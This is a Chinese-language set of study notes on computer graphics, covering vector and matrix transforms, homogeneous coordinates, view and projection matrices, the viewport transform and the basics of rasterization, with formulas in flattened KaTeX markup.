计算CP与CA的叉乘，得到结果为z轴正方向，P在CA左侧 那么就可以认为P在三角形的内部。即判断P点是否在三条边的同侧 坐标系 有了点乘和叉乘，就可以构造三维坐标系，考虑构造如下坐标系： ∣u⃗∣=∣v⃗∣=∣w⃗∣=1u⃗⋅v⃗=v⃗⋅w⃗=u⃗⋅w⃗=0w⃗=u⃗×v⃗(right−handed)p⃗=(p⃗⋅u⃗)u⃗+(p⃗⋅v⃗)v⃗+(p⃗⋅w⃗)w⃗|\\vec u| = |\\vec v| = |\\vec w| = 1 \\\\ \\vec u \\cdot \\vec v = \\vec v \\cdot \\vec w = \\vec u \\cdot \\vec w = 0 \\\\ \\vec w = \\vec u \\times \\vec v (right-handed) \\\\ \\vec p = (\\vec p \\cdot \\vec u)\\vec u + (\\vec p \\cdot \\vec v) \\vec v + (\\vec p \\cdot \\vec w)\\vec w ∣u∣=∣v∣=∣w∣=1u⋅v=v⋅w=u⋅w=0w=u×v(right−handed)p​=(p​⋅u)u+(p​⋅v)v+(p​⋅w)w 可见对于任意三维向量P，可以将其分解到这个坐标系 矩阵 矩阵乘法 (M×N)(N×P)=(M×P)(M \\times N)(N \\times P) = (M \\times P)(M×N)(N×P)=(M×P) 其中矩阵(M×P)=C(M \\times P) = C(M×P)=C中的元素cijc_{ij}cij​等于矩阵(M×N)=A(M \\times N) = A(M×N)=A的第i行表示的向量，点乘，矩阵(N×P)=B(N \\times P) = B(N×P)=B的第j列表示的向量。 矩阵乘法满足以下定律： 结合律 分配律（左分配率，右分配律） 矩阵的转置 转置具有以下性质： (AB)T=BTAT(AB)^T = B^TA^T(AB)T=BTAT 特殊矩阵 单位矩阵 对角矩阵 逆矩阵，由性质：(AB)−1=B−1A−1(AB)^{-1} = B^{-1}A^{-1}(AB)−1=B−1A−1 矩阵变换 使用矩阵与向量的乘积操作，可以完成向量在坐标系下的变换，例如二维的y轴对称变换： (−1001)(xy)=(−xy)\\left( \\begin{matrix} -1 &amp; 0 \\\\ 0 &amp; 1 \\end{matrix} \\right) \\left( \\begin{matrix} x\\\\ y \\end{matrix} \\right) = \\left( \\begin{matrix} -x \\\\ y \\end{matrix} \\right) (−10​01​)(xy​)=(−xy​) 变换 变换可以大致分为以下两个方面： Modeling，模型变换 Viewing，视图变换 例如在逆运动学中的应用。 正运动学：已知各个关节的角度，求末端的位置 逆运动学（IK,inverse kinematics）：已知末端的位置，求各个关节的角度 二维线性变换 缩放 二维缩放操作可以用如下数学形式表示： x′=sxxy′=syyx&#x27; = s_x x \\\\ y&#x27; = s_y y x′=sx​xy′=sy​y 写成矩阵形式为： (x′y′)=(sx00sy)(xy)\\left( \\begin{matrix} x&#x27; \\\\ y&#x27; \\end{matrix} \\right) = \\left( \\begin{matrix} s_x &amp; 0 \\\\ 0 &amp; s_y \\end{matrix} \\right) \\left( \\begin{matrix} x \\\\ y \\end{matrix} \\right) (x′y′​)=(sx​0​0sy​​)(xy​) 反射 二维反射可以用如下数学形式表示： (x′y′)=(−1001)(xy)\\left( \\begin{matrix} x&#x27; \\\\ y&#x27; \\end{matrix} \\right) = \\left( \\begin{matrix} -1 &amp; 0 \\\\ 0 &amp; 1 \\end{matrix} \\right) \\left( \\begin{matrix} x \\\\ y \\end{matrix} \\right) (x′y′​)=(−10​01​)(xy​) 上述操作使得物体按y轴反射 切变（Shear） 注意该变换有如下特点： 垂直方向的坐标并未改变 水平方向上，当y=0时，也不发生变换 水平方向上，当y=1时，原坐标0移动了a个单位 通过观察可以发现水平方向上移动的距离可以用ay来表示，因此该变换可以用如下形式表示： (x′y′)=(1a01)(xy)\\left( \\begin{matrix} x&#x27; \\\\ y&#x27; \\end{matrix} \\right) = \\left( \\begin{matrix} 1 &amp; a \\\\ 0 &amp; 1 \\end{matrix} \\right) \\left( \\begin{matrix} x \\\\ y \\end{matrix} \\right) (x′y′​)=(10​a1​)(xy​) 旋转（Rotate） 此处讨论绕原点逆时针旋转。 我们可以利用特殊点得到旋转的变换矩阵（前提是旋转为线性变换）： 最终得到的变换矩阵为： (cosθ−sinθsinθcosθ)\\left( \\begin{matrix} cos\\theta &amp; -sin\\theta \\\\ sin\\theta &amp; cos\\theta \\end{matrix} \\right) (cosθsinθ​−sinθcosθ​) 总结 对于上述的可以表示为矩阵乘以向量得到的变换称为线性变换 齐次坐标（Homogeneous Coordinates） 齐次坐标的引入：平移坐标变换的特殊性 若需要将平移变换表示为矩阵形式，那么只能使用如下发给发进行 (x′y′)=(abcd)(xy)+(txty)\\left( \\begin{matrix} x&#x27; \\\\ y&#x27; \\end{matrix} \\right) = \\left( \\begin{matrix} a &amp; b \\\\ c &amp; d \\end{matrix} \\right) \\left( \\begin{matrix} x \\\\ y \\end{matrix} \\right) + \\left( \\begin{matrix} t_x \\\\ t_y \\end{matrix} \\right) (x′y′​)=(ac​bd​)(xy​)+(tx​ty​​) 说明平移变换不再属于线性变换。 但我们希望用一个更鲁棒的方式来表示这些变换。 于是我们在原有的维度上增加一个维度，以二维为例： 表示一个二维的点：point=(x,y,1)Tpoint = (x,y,1)^Tpoint=(x,y,1)T 表示一个二维的向量：vector=(x,y,0)Tvector = (x,y,0)^Tvector=(x,y,0)T 为什么要用0和1去区分点和向量呢（怎么有点脆皮鸭内味） 原因是向量具有平移不变性，我们希望对向量进行平移操作时不会导致向量的改变。 更进一步，我们希望在齐次坐标系下，点和向量之间应依然存在如下关系： vector+vector=vectorpoint−point=pointpoint+vector=pointpoint+point=??vector + vector = vector \\\\ point - point = point \\\\ point + vector = point \\\\ point + point = ?? vector+vector=vectorpoint−point=pointpoint+vector=pointpoint+point=?? 对于其次坐标系下的的点的加法的定义我们仍然需要进行扩充，考虑相加之后得到的数据： (x1y1w1)+(x2y2w2)=((x1+x2)/(w1+w2)(y1+y2)/(w1+w2)1)\\left( \\begin{matrix} x_1 \\\\ y_1 \\\\ w_1 \\end{matrix} \\right) + \\left( \\begin{matrix} x_2 \\\\ y_2 \\\\ w_2 \\end{matrix} \\right) = \\left( \\begin{matrix} (x_1+x_2)/(w_1+w_2) \\\\ (y_1 + y_2)/(w_1 + w_2) \\\\ 1 \\end{matrix} \\right) ⎝⎛​x1​y1​w1​​⎠⎞​+⎝⎛​x2​y2​w2​​⎠⎞​=⎝⎛​(x1​+x2​)/(w1​+w2​)(y1​+y2​)/(w1​+w2​)1​⎠⎞​ 若两个数据均为其次坐标系下的点，那么w1=w2=1w_1 = w_2 = 1w1​=w2​=1，于是该加法就能用于表示两个点的中点。 最后在其次坐标下使用矩阵表示变换就能使用如下形式： (x′y′w′)=(10tx01ty001)(xy1)+(x+txy+ty1)\\left( \\begin{matrix} x&#x27; \\\\ y&#x27; \\\\ w&#x27; \\end{matrix} \\right) = \\left( \\begin{matrix} 1 &amp; 0 &amp; t_x \\\\ 0 &amp; 1 &amp; t_y \\\\ 0 &amp; 0 &amp; 1 \\end{matrix} \\right) \\left( \\begin{matrix} x \\\\ y \\\\ 1 \\end{matrix} \\right) + \\left( \\begin{matrix} x + t_x \\\\ y + t_y \\\\ 1 \\end{matrix} \\right) ⎝⎛​x′y′w′​⎠⎞​=⎝⎛​100​010​tx​ty​1​⎠⎞​⎝⎛​xy1​⎠⎞​+⎝⎛​x+tx​y+ty​1​⎠⎞​ 仿射变换（Affine Transformations） 既然有了齐次坐标系这么好的东西，那么我们就能思考如何将线性变换和平移变换进行表示，现在它们有了一个新的名字，我们称线性变换+平移变化 = 仿射变换。 需要注意的是，使用齐次坐标表示的变换矩阵是先进行线性变换再进行平移变换。 (x′y′)=(abcd)(xy)+(txty)(x′y′1)=(abtxcdty001)(xy1)\\left( \\begin{matrix} x&#x27; \\\\ y&#x27; \\end{matrix} \\right) = \\left( \\begin{matrix} a &amp; b \\\\ c &amp; d \\end{matrix} \\right) \\left( \\begin{matrix} x \\\\ y \\end{matrix} \\right) + \\left( \\begin{matrix} t_x \\\\ t_y \\end{matrix} \\right) \\\\ \\left( \\begin{matrix} x&#x27; \\\\ y&#x27; \\\\ 1 \\end{matrix} \\right) = \\left( \\begin{matrix} a &amp; b &amp; t_x \\\\ c &amp; d &amp; t_y \\\\ 0 &amp; 0 &amp; 1 \\end{matrix} \\right) \\left( \\begin{matrix} x \\\\ y \\\\ 1 \\end{matrix} \\right) (x′y′​)=(ac​bd​)(xy​)+(tx​ty​​)⎝⎛​x′y′1​⎠⎞​=⎝⎛​ac0​bd0​tx​ty​1​⎠⎞​⎝⎛​xy1​⎠⎞​ 变换的组合（Composite Transform） 对于默认为列向量，变换通常通过左乘变换矩阵实现，然后以从右到左的计算顺序计算变换的结果，由于矩阵的乘法没有交换率，因此变换的先后顺序变得极为重要。 但由于矩阵满足结合率，因此可以先将变换矩阵相乘后在应用到目标向量上。 An(...A2(A1(x)))=(An...A2...A1)(xy1)A_n(...A_2(A_1(x))) = (A_n ... A_2...A_1) \\left( \\begin{matrix} x \\\\ y \\\\ 1 \\end{matrix} \\right) An​(...A2​(A1​(x)))=(An​...A2​...A1​)⎝⎛​xy1​⎠⎞​ 逆变换（Inverse Transform） 逆变换即与某个变换效果相反的变换，在数学上，如果一个变换是通过左乘一个变换矩阵MMM完成的，那么它的逆变换就是变换后的向量左乘一个M−1M^{-1}M−1 变换的分解（Decomposing Complex Transforms) 考虑这样一个问题： 现在存在一个左下角c不在原点的矩形 我们希望以矩形的左下角为基准将其旋转一个角度a 我们可以通过如下几个步骤完成这个操作： 将c点平移到原点 绕原点旋转角度a 将c点移动回原位 三维空间的变换 三维空间中我们同样希望使用齐次坐标系表示三维坐标中的点和向量，于是得到一个与二维空间类似的结果： 表示一个二维的点：point=(x,y,z,1)Tpoint = (x,y,z,1)^Tpoint=(x,y,z,1)T 表示一个二维的向量：vector=(x,y,z,0)Tvector = (x,y,z,0)^Tvector=(x,y,z,0)T 当w不为1且不为0时，齐次坐标系下的点(x,y,z,w)(x,y,z,w)(x,y,z,w)所表示的三维空间中的点为：(x/w,y/w,z/w)(x/w,y/w,z/w)(x/w,y/w,z/w) 同样三维空间中的仿射变换可以表示为如下形式： (x′y′z′1)=(abctxdeftyghitz0001)(xyz1)\\left( \\begin{matrix} x&#x27; \\\\ y&#x27; \\\\ z&#x27; \\\\ 1 \\end{matrix} \\right) = \\left( \\begin{matrix} a &amp; b &amp; c &amp; t_x \\\\ d &amp; e &amp; f &amp; t_y \\\\ g &amp; h &amp; i &amp; t_z \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right) \\left( \\begin{matrix} x \\\\ y \\\\ z \\\\ 1 \\end{matrix} \\right) ⎝⎜⎜⎜⎛​x′y′z′1​⎠⎟⎟⎟⎞​=⎝⎜⎜⎜⎛​adg0​beh0​cfi0​tx​ty​tz​1​⎠⎟⎟⎟⎞​⎝⎜⎜⎜⎛​xyz1​⎠⎟⎟⎟⎞​ 二位变换补充： 在不考虑齐次坐标的情况下，旋转变换使用的矩阵是一个正交矩阵（Orthogonal Matrix），实际上他还是一个单位正交阵 三维空间中的线性变换与平移变换 缩放 S(sx,sy,sz)=(sx0000sy0000sz00001)S(s_x, s_y, s_z) = \\left( \\begin{matrix} s_x &amp; 0 &amp; 0 &amp; 0 \\\\ 0 &amp; s_y &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; s_z &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right) S(sx​,sy​,sz​)=⎝⎜⎜⎜⎛​sx​000​0sy​00​00sz​0​0001​⎠⎟⎟⎟⎞​ 平移 T(tx,ty,tz)=(100tx010ty001tz0001)T(t_x, t_y, t_z) = \\left( \\begin{matrix} 1 &amp; 0 &amp; 0 &amp; t_x \\\\ 0 &amp; 1 &amp; 0 &amp; t_y \\\\ 0 &amp; 0 &amp; 1 &amp; t_z \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right) T(tx​,ty​,tz​)=⎝⎜⎜⎜⎛​1000​0100​0010​tx​ty​tz​1​⎠⎟⎟⎟⎞​ 旋转 x轴 Rx(α)=(10000cosα−sinα00sinαcosα00001)R_x(\\alpha) = \\left( \\begin{matrix} 1 &amp; 0 &amp; 0 &amp; 0 \\\\ 0 &amp; cos\\alpha &amp; -sin\\alpha &amp; 0 \\\\ 0 &amp; sin\\alpha &amp; cos\\alpha &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right) Rx​(α)=⎝⎜⎜⎜⎛​1000​0cosαsinα0​0−sinαcosα0​0001​⎠⎟⎟⎟⎞​ y轴 Ry(α)=(cosα0sinα00100−sinα0cosα00001)R_y(\\alpha) = \\left( \\begin{matrix} cos\\alpha &amp; 0 &amp; sin\\alpha &amp; 0 \\\\ 0 &amp; 1 &amp; 0 &amp; 0 \\\\ -sin\\alpha &amp; 0 &amp; cos\\alpha &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right) Ry​(α)=⎝⎜⎜⎜⎛​cosα0−sinα0​0100​sinα0cosα0​0001​⎠⎟⎟⎟⎞​ z轴 Rz(α)=(cosα−sinα00sinαcosα0000100001)R_z(\\alpha) = \\left( \\begin{matrix} cos\\alpha &amp; -sin\\alpha &amp; 0 &amp; 0 \\\\ sin\\alpha &amp; cos\\alpha &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; 1 &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right) Rz​(α)=⎝⎜⎜⎜⎛​cosαsinα00​−sinαcosα00​0010​0001​⎠⎟⎟⎟⎞​ 对于如上公式，我们观察到，在对y轴进行旋转的矩阵中，如果将非0，1的数值提取出来组成2维变换矩阵，得到的变换矩阵与其余两个轴形成的变换矩阵刚好互为逆，这是为什么呢？因为此处反应的是x叉乘z，在右手坐标系中x叉乘z得到的是-y，因此此处为原2维变换的逆。 那么在三维空间中的旋转可以通过组合三种单轴的旋转得到： Rxyz(α,β,γ)=Rx(α)Ry(β)Rz(γ)R_{xyz}(\\alpha, \\beta,\\gamma) = R_x(\\alpha)R_y(\\beta)R_z(\\gamma) Rxyz​(α,β,γ)=Rx​(α)Ry​(β)Rz​(γ) 这些旋转角度被称为欧拉角 可用于飞机的模拟：roll，pitch，yaw 罗德里格斯旋转公式（Rodrigues‘ Rotation Formula）(待证) 对于一个旋转轴n⃗\\vec nn与旋转角度α\\alphaα，有： R(n⃗,α)=cos(α)I+(1−cos(α)n⃗n⃗T+sin(α))(0−nznynz0−nx−nynx0)⏟NR(\\vec n, \\alpha) = cos(\\alpha)I + (1-cos(\\alpha)\\vec n {\\vec n}^T \\\\ + sin(\\alpha)) \\underbrace { \\left( \\begin{matrix} 0 &amp; -n_z &amp; n_y \\\\ n_z &amp; 0 &amp; -n_x \\\\ -n_y &amp; n_x &amp; 0 \\end{matrix} \\right) }_N \\\\ R(n,α)=cos(α)I+(1−cos(α)nnT+sin(α))N⎝⎛​0nz​−ny​​−nz​0nx​​ny​−nx​0​⎠⎞​​​ 可见最后一项使用的矩阵是一个dual matrix，可联想到之前学过的叉积的矩阵表示。 此外旋转变换中还有一个概念叫四元数，该概念主要解决的是旋转中插值的问题，即：对于一个向量先旋转15°再旋转25°，如果我们将两个变换矩阵加起来求平均再应用到目标向量上，得到的结果并不是旋转20° 观测变换Viewing transformation 视图变换View/Camera Transformation 思考显示生活中如何得到一张三维世界的照片： 找到一个好的位置，给拍照的人都安排好占位（对应图形学中的模型变换model transformation） 找好角度，放置摄像机（对应图形学中的视图变换View transformation） 拍照（对应图形学中的投影变换Projection transformation） 因此可以体会出视图变换的第一步是摆放相机，也就是确定相机的位置。 相机的位置Position e⃗\\vec ee 视线方向Look-at/gaze direction g⃗\\vec gg​ 拍摄方式（横拍还是竖拍），可以定义一个向上方向t⃗\\vec tt用以表示相机的垂直方向。 下面我们思考这样一个简单的物理问题： 如果一个被拍摄物体发生了移动，相机也放生了完全相同的移动，那么我们最终拍摄出来的照片将不会改变。 即物体相对相机静止。 因此为了便于之后的计算，我们为相机设置了一个标准位置： 初始位置时相机位于坐标（0，0，0） 认为t⃗\\vec tt为Y轴，g⃗\\vec gg​为-Z轴 然后对物体做相同的变换操作即可 那么对于一个原本位置描述为e⃗,g⃗,t⃗\\vec e,\\vec g,\\vec te,g​,t的相机，将其移动到标准位置后，被该相机拍摄的物体应该做如下变换： 将e⃗\\vec ee平移到(0,0,0) 将g⃗\\vec gg​旋转到-Z 将t⃗\\vec tt旋转到Y 将t⃗×g⃗\\vec t \\times \\vec gt×g​旋转到X 那么思考如上的变换转化为矩阵形式应该怎么做呢？我们一步一步来。 首先需要进行平移变换，于是可以写出平移变换矩阵： Tview=[100−xe⃗010−ye⃗001−ze⃗0001]T_{view} = \\left[ \\begin{matrix} 1 &amp; 0 &amp; 0 &amp; -x_{\\vec e} \\\\ 0 &amp; 1 &amp; 0 &amp; -y_{\\vec e} \\\\ 0 &amp; 0 &amp; 1 &amp; -z_{\\vec e} \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right] Tview​=⎣⎢⎢⎢⎡​1000​0100​0010​−xe​−ye​−ze​1​⎦⎥⎥⎥⎤​ 使用该矩阵就能将点e⃗\\vec ee平移到原点。 接下来思考剩下的三个旋转操作，对于这三个旋转问题求解显然比较困难，此时我们可以使用逆向思维，先求出逆向变换的变换矩阵，再通过求逆向变换矩阵的逆得到正向变换的矩阵。 考虑由将-Z旋转到g⃗\\vec gg​；将Y旋转为t⃗\\vec tt；将X旋转为t⃗×g⃗\\vec t \\times \\vec gt×g​，可以使用如下矩阵进行： Rview−1=[xg^×t^xt⃗x−g⃗0yg^×t^yt⃗y−g⃗0zg^×t^zt⃗z−g⃗00001]R^{-1}_{view} = \\left[ \\begin{matrix} x_{\\hat g \\times \\hat t} &amp; x_{\\vec t} &amp; x_{- \\vec g} &amp; 0 \\\\ y_{\\hat g \\times \\hat t} &amp; y_{\\vec t} &amp; y_{-\\vec g} &amp; 0 \\\\ z_{\\hat g \\times \\hat t} &amp; z_{\\vec t} &amp; z_{-\\vec g} &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right] Rview−1​=⎣⎢⎢⎢⎡​xg^​×t^​yg^​×t^​zg^​×t^​0​xt​yt​zt​0​x−g​​y−g​​z−g​​0​0001​⎦⎥⎥⎥⎤​ 那么如何求这个矩阵的逆矩阵呢？这就联想到之前说到的旋转矩阵是一个正交阵。因此该矩阵的逆矩阵等于其转置，于是最终得到的正向旋转矩阵为： Rview=[xg^×t^yg^×t^zg^×t^0xt⃗yt⃗zt⃗0x−g⃗y−g⃗z−g⃗00001]R_{view} = \\left[ \\begin{matrix} x_{\\hat g \\times \\hat t} &amp; y_{\\hat g \\times \\hat t} &amp; z_{\\hat g \\times \\hat t} &amp; 0 \\\\ x_{\\vec t} &amp; y_{\\vec t} &amp; z_{\\vec t} &amp; 0 \\\\ x_{- \\vec g} &amp; y_{-\\vec g} &amp; z_{-\\vec g} &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right] Rview​=⎣⎢⎢⎢⎡​xg^​×t^​xt​x−g​​0​yg^​×t^​yt​y−g​​0​zg^​×t^​zt​z−g​​0​0001​⎦⎥⎥⎥⎤​ 最终得到的变换矩阵就为：（注意顺序） Mview=RviewTviewM_{view} = R_{view}T_{view} Mview​=Rview​Tview​ 可见视图变换最终得到的矩阵与模型变换一样，最终需要应用到模型上，因此，视图变换与模型变换通常被合称为模型视图变换（ModelView Transformation） 投影变换（Projection transformation） 正交投影（Orthographic projection） 透视投影（Perspective projection） 他们的本质区别是：正交投影不会造成近大远小的线性。 此处引用一个非常经典的梗[道理我都懂，但是为什么鸽子这么大]((3 封私信 / 50 条消息) “你说的好有道理，但是鸽子为什么这么大啊？”什么意思 - 知乎 (zhihu.com)) 实际上，从数学角度说明： 所谓透视投影，我们认为摄像机放置在空间中的某个位置，并且认为摄像机是一个点 所谓正交投影，我们认为摄像机与被摄像物体距离无限远。 正交投影 将相机放置在标准位置 忽略Z轴 使用缩放、平移变换讲物体变换到[−1,1]2[-1,1]^2[−1,1]2 更正式的做法是： 我们希望讲如下定义的一个空间立方体 定义x轴y轴z轴分别属于如下三个范围 [l,r],[b,t],[f,n] 现在我们希望对其进行Canonical（正则、标准、规范）化，即将该立方体映射为[−1,1]3[-1,1]^3[−1,1]3定义的范围 那么我们可以使用如下两部操作对其进行变换： 将中心点移动到坐标原点 将三个轴分别映射到[-1,1] 那么我们可以得到如下的变换矩阵： Mortho=[2r−l00002t−b00002n−f00001][100−r+l2010−t+b2001−n+f20001]M_{ortho} = \\left[ \\begin{matrix} \\frac{2}{r-l} &amp; 0 &amp; 0 &amp; 0 \\\\ 0 &amp; \\frac{2}{t-b} &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; \\frac{2}{n-f} &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right] \\left[ \\begin{matrix} 1 &amp; 0 &amp; 0 &amp; -\\frac{r+l}{2} \\\\ 0 &amp; 1 &amp; 0 &amp; -\\frac{t+b}{2} \\\\ 0 &amp; 0 &amp; 1 &amp; -\\frac{n+f}{2} \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right] Mortho​=⎣⎢⎢⎢⎡​r−l2​000​0t−b2​00​00n−f2​0​0001​⎦⎥⎥⎥⎤​⎣⎢⎢⎢⎡​1000​0100​0010​−2r+l​−2t+b​−2n+f​1​⎦⎥⎥⎥⎤​ 需要注意的是此处我们是向着-Z方向观测，因此near(n)的值要比far(f)的值大 这也是OpenGL中使用的是左手系的原因 透视投影 透视投影是图形学中使用做广泛的投影变换 会产生近大远小的线性 相互平行的先将不在平行，而是相交于一个点 欧式几何中定义的是一个同一平面内平行的线不会相交，而透视投影会将物体投影到另一平面 透视投影的做法： 此处我们引入一个几何图形：Frustum： 那么透视投影可以分解为两个部分： 将位于Frustum远处的四边形通过挤压使得大小等于位于近处的四边形，即将Frustum变换为Cuboid 然后对Cuboid进行正交投影即可 对于挤压操作，我们需要它具有如下性质： 挤压操作不会使得近平面发生变化 挤压操作不会使得远平面上的点的Z坐标发生变化 挤压操作不会使得远平面的中心点发生变化 于是我们需要求出从Frustum变化为Cuboid的变化矩阵： 首先我们希望挤压使得远平面上的点与近平面对其，因此我们从x轴负方向观测这个图像可以得到如下结果： 可见图中存在一对很明显的相似三角形，因此利用相似三角形对应边成比例的性质，我们可以得到如下变换：y′=nzyy&#x27; = \\frac{n}{z}yy′=zn​y 同理可以得到x的变换为x′=nzxx&#x27; = \\frac{n}{z}xx′=zn​x 因此可以暂时性的写出变换后的形式： [xyz1]→[nx/zny/zunknown1][nxnystillunknownz]\\left[ \\begin{matrix} x \\\\ y \\\\ z \\\\ 1 \\end{matrix} \\right] \\to \\left[ \\begin{matrix} nx/z \\\\ ny/z \\\\ unknown \\\\ 1 \\end{matrix} \\right] \\left[ \\begin{matrix} nx \\\\ ny \\\\ still unknown \\\\ z \\end{matrix} \\right] ⎣⎢⎢⎢⎡​xyz1​⎦⎥⎥⎥⎤​→⎣⎢⎢⎢⎡​nx/zny/zunknown1​⎦⎥⎥⎥⎤​⎣⎢⎢⎢⎡​nxnystillunknownz​⎦⎥⎥⎥⎤​ 因此从结果推过程，我们可以得到变换矩阵的部分形式如下： Mpersp→ortho=[n0000n00????0010]M_{persp\\to ortho} = \\left[ \\begin{matrix} n &amp; 0 &amp; 0 &amp; 0 \\\\ 0 &amp; n &amp; 0 &amp; 0 \\\\ ? &amp; ? &amp; ? &amp; ? \\\\ 0 &amp; 0 &amp; 1 &amp; 0 \\end{matrix} \\right] Mpersp→ortho​=⎣⎢⎢⎢⎡​n0?0​0n?0​00?1​00?0​⎦⎥⎥⎥⎤​ 那么对于未知值我们应该如何补充呢？我们发现我们还有两个可以使用的条件： 挤压操作不会使得近平面发生变化 挤压操作不会使得远平面上的点的Z坐标发生变化 那么对于在近平面上的任意一点，它变换后最终会得到如下结果： [xyn1]→[xyn1]==[nxnyn2n] \\left[ \\begin{matrix} x \\\\ y \\\\ n \\\\ 1 \\end{matrix} \\right] \\to \\left[ \\begin{matrix} x \\\\ y \\\\ n \\\\ 1 \\end{matrix} \\right] == \\left[ \\begin{matrix} nx \\\\ ny \\\\ n^2 \\\\ n \\end{matrix} \\right] ⎣⎢⎢⎢⎡​xyn1​⎦⎥⎥⎥⎤​→⎣⎢⎢⎢⎡​xyn1​⎦⎥⎥⎥⎤​==⎣⎢⎢⎢⎡​nxnyn2n​⎦⎥⎥⎥⎤​ 通过得到的Z坐标是不含xy的常数，我们可以假设变换矩阵中的第三行为如下形式： [00AB][xyn1]=n2\\left[ \\begin{matrix} 0 &amp; 0 &amp; A &amp; B \\end{matrix} \\right] \\left[ \\begin{matrix} x \\\\ y \\\\ n \\\\ 1 \\end{matrix} \\right] =n^2 [0​0​A​B​]⎣⎢⎢⎢⎡​xyn1​⎦⎥⎥⎥⎤​=n2 ​ 而对于在远平面上的任意一点，它也会遵循Z不变的结果，此时我们取具有代表性的中心点，计算它经过变换后的得到的点将是： [00f1]→[00f1]==[00f2f]\\left[ \\begin{matrix} 0 \\\\ 0 \\\\ f \\\\ 1 \\end{matrix} \\right] \\to \\left[ \\begin{matrix} 0 \\\\ 0 \\\\ f \\\\ 1 \\end{matrix} \\right] == \\left[ \\begin{matrix} 0 \\\\ 0 \\\\ f^2 \\\\ f \\end{matrix} \\right] ⎣⎢⎢⎢⎡​00f1​⎦⎥⎥⎥⎤​→⎣⎢⎢⎢⎡​00f1​⎦⎥⎥⎥⎤​==⎣⎢⎢⎢⎡​00f2f​⎦⎥⎥⎥⎤​ 于是又可以得到一个方程： [00AB][00f1]=f2\\left[ \\begin{matrix} 0 &amp; 0 &amp; A &amp; B \\end{matrix} \\right] \\left[ \\begin{matrix} 0 \\\\ 0 \\\\ f \\\\ 1 \\end{matrix} \\right] =f^2 [0​0​A​B​]⎣⎢⎢⎢⎡​00f1​⎦⎥⎥⎥⎤​=f2 最终我们得到了如下方程组： {An+B=n2Af+B=f2\\begin{cases} An + B = n^2 \\\\ Af + B = f^2 \\end{cases} {An+B=n2Af+B=f2​ 最终解出AB得到变换矩阵： Mpersp→ortho=[n0000n0000n+f−nf0010]M_{persp\\to ortho} = \\left[ \\begin{matrix} n &amp; 0 &amp; 0 &amp; 0 \\\\ 0 &amp; n &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; n+f &amp; -nf \\\\ 0 &amp; 0 &amp; 1 &amp; 0 \\end{matrix} \\right] Mpersp→ortho​=⎣⎢⎢⎢⎡​n000​0n00​00n+f1​00−nf0​⎦⎥⎥⎥⎤​ 光栅化Rasterize 现定义视锥中的两个概念： aspect ratio——可见范围的长宽比 Field of View（fov）可视角度 vertical field of view （fovY）垂直可视角 现在我们将视锥变换到与正交投影长方体相同的空间： Canonical Cube to Screen 完成MVP（modeling，viewing，Projection）变换后，我们希望能将完成变换的标准化矩形[−1,1]3[-1,1]^3[−1,1]3显示在屏幕上，那么我们首先必须确定，什么是屏幕。 我们认为屏幕是： 二维像素数组 分辨率（resolution）：数组大小 一个典型的光栅（raster）成像设备 Raster光栅 实际上Raster正是德语中的屏幕Screen 而光栅化（Rasterize）就是指将物体画在屏幕上的过程 像素Pixel 像素实际上是picture element的缩写 到目前为止我们可以认为一个像素就是一个小方块，其中被统一的颜色填充。 屏幕空间 在本节课中，我们定义屏幕空间的原点位于屏幕的左下角。（区别于图像处理中的左上角） 对于屏幕上的像素，我们使用一对屏幕空间中的坐标(x,y)(x,y)(x,y)表示，其中下x，y为整数。 实际上坐标为(x,y)(x,y)(x,y)的像素的中心位于(x+0.5,y+0.5)(x+0.5, y+0.5)(x+0.5,y+0.5) 转换到屏幕空间 转化到屏幕空间时，我们需要两部操作： 忽略z 将xy由[−1,1]2[-1,1]^2[−1,1]2转化到[0,width]×[0,height][0, width] \\times [0, height][0,width]×[0,height] 于是我们可以写出变换矩阵： Mvierwport=[width200width20height20height200100001]M_{vierwport} = \\left[ \\begin{matrix} \\frac{width}{2} &amp; 0 &amp; 0 &amp; \\frac{width}{2} \\\\ 0 &amp; \\frac{height}{2} &amp; 0 &amp; \\frac{height}{2} \\\\ 0 &amp; 0 &amp; 1 &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{matrix} \\right] Mvierwport​=⎣⎢⎢⎢⎡​2width​000​02height​00​0010​2width​2height​01​⎦⎥⎥⎥⎤​ 该变换被称为视口变换，改变换相当于先做了一次拉伸，再将左下角平移到屏幕中心。 为了更好的理解光栅化，接下来列举以下绘画机器： CNC Sharpie Drawing Machine Laser Cutters 然后再来看看一些不同的光栅设备： Oscilloscope 示波器 与早期的电视机一样，使用阴极射线管(Cathode Ray Tube)成像，即CRT显示器 其中使用了一项隔行扫描的技术，对于一张图，先显示其奇数行，再显示器偶数行 该方法会导致严重的画面撕裂 现代显示技术使用了显存技术（Frame Buffer） Flat Panel Displays平板显示设备 LCD（Liquid Crystal Display）液晶显示器 利用的是液晶的物理特性 LED （Light emitting diode array） Electrophoretic（Electronic Ink）Display 下面我们讨论如何在上述显示设备上绘制 三角形 图形学中表示一个形体有： Polygon Meshes Triangle Meshes 下面我们着重来讨论以下三角形。 为什么使用三角形来表示呢： 三角形是三维空间中最基础的多边形 任何不同的多边形都可以拆解为三角形 给定任意三个点连成的三角形一定能形成一个平坦的平面 三角形的内外定义十分清晰（不存在既是凸多边形又是三角形的形体） 对于一个三角形，其内部的点的可以通过该点与三角形的三个顶点的位置关系，描述一个渐变的属性，即可以很好的完成插值 那么考虑使用一个三角形来将物体绘制到屏幕上。 采样 采样，即将一个连续函数离散化的过程。 